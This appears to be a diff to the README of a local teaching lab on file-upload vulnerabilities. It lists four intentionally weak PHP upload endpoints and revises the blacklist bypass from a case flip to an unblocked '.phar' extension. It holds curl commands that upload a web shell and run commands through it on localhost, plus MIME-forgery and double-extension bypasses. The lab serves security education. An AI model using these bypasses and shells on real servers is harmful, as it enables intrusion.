@@ -7,7 +7,7 @@ The companion lab for TechEarl's file-upload vulnerabilities spoke article. A sm
 | Endpoint | Validation | Stored under | Bypass |
 |---|---|---|---|
 | `/upload-naive.php` | None | `/uploads/naive/` | Upload `shell.php` directly |
-| `/upload-blacklist.php` | Case-sensitive blacklist of `php`, `phtml`, `php3`, `php4` | `/uploads/blacklist/` | `shell.phP`, `shell.pht`, or `shell.phar` |
+| `/upload-blacklist.php` | Case-sensitive blacklist of `php`, `phtml`, `php3`, `php4` | `/uploads/blacklist/` | `shell.phar` (the lab's Apache config maps `.phar` to mod_php; the blacklist forgot to block it) |
 | `/upload-mime.php` | Client-supplied `Content-Type` must be `image/jpeg` | `/uploads/mime/` | Send `.php` with a forged multipart `Content-Type: image/jpeg` |
 | `/upload-double-ext.php` | Trailing extension blacklist (case-insensitive), but the upload directory uses `AddHandler` | `/uploads/double-ext/` | `shell.php.jpg` (Apache executes any file whose name contains `.php`) |
 
@@ -42,15 +42,16 @@ curl -F 'file=@shell.php' http://localhost:8083/upload-naive.php
 curl 'http://localhost:8083/uploads/naive/shell.php?c=id'
 ```
 
-### 2. Blacklist (case bypass)
+### 2. Blacklist (forgotten extension)
 
 ```bash
-cp shell.php shell.phP
-curl -F 'file=@shell.phP' http://localhost:8083/upload-blacklist.php
-curl 'http://localhost:8083/uploads/blacklist/shell.phP?c=id'
+curl -F 'file=@shell.php;filename=shell.phar' http://localhost:8083/upload-blacklist.php
+curl 'http://localhost:8083/uploads/blacklist/shell.phar?c=id'
 ```
 
-The `.pht` and `.phar` variants work the same way when the mod_php config maps either to the PHP handler (`.phar` typically does).
+The blacklist blocks `php`, `phtml`, `php3`, `php4` but forgets `phar`. The lab's Apache config explicitly adds `.phar` to the PHP handler (a realistic misconfiguration: PHAR support gets enabled for a tool that needs it and the upload-handler blacklist never gets updated to match). On stock Apache without the `.phar` handler the upload still succeeds, but the file is served as plain text rather than executed; the bypass therefore depends on the server adding `.phar` (or `.pht`, `.phtml` if those are not also blacklisted) to its executable-extension list.
+
+The case-flip variant `shell.phP` works only on Apache builds where the extension match is case-insensitive. Stock `mod_php` on Debian-based images is case-sensitive (matches `\.php$` literally), so the case-flip does not bypass against this lab; the canonical real-world bypass against this validation pattern is the forgotten extension.
 
 ### 3. MIME (forged Content-Type)
 
